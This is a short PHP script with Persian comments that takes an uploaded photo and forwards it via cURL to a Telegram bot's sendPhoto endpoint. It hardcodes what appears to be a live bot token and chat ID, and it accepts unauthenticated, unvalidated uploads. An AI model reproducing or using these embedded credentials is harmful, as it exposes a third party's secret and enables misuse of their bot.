<?php
$token = '7405655297:AAFWGG6GoiP4vz_v-txDbMKrOLaqynOMkRA'; // جایگزین با توکن ربات تلگرام
$chat_id = '7157112319'; // جایگزین با شناسه چت تلگرام

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['photo'])) {
    $photo = $_FILES['photo']['tmp_name'];

    if (is_uploaded_file($photo)) {
        $file_data = new CURLFile($photo, 'image/jpeg', 'photo.jpg');

        $url = "https://api.telegram.org/bot$token/sendPhoto";

        $post_fields = [
            'chat_id' => $chat_id,
            'photo' => $file_data
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        echo $response; // برای مشاهده پاسخ می‌توانید این خط را نگه دارید
    } else {
        echo 'File upload failed.';
    }
} else {
    echo 'No photo uploaded.';
}
?>
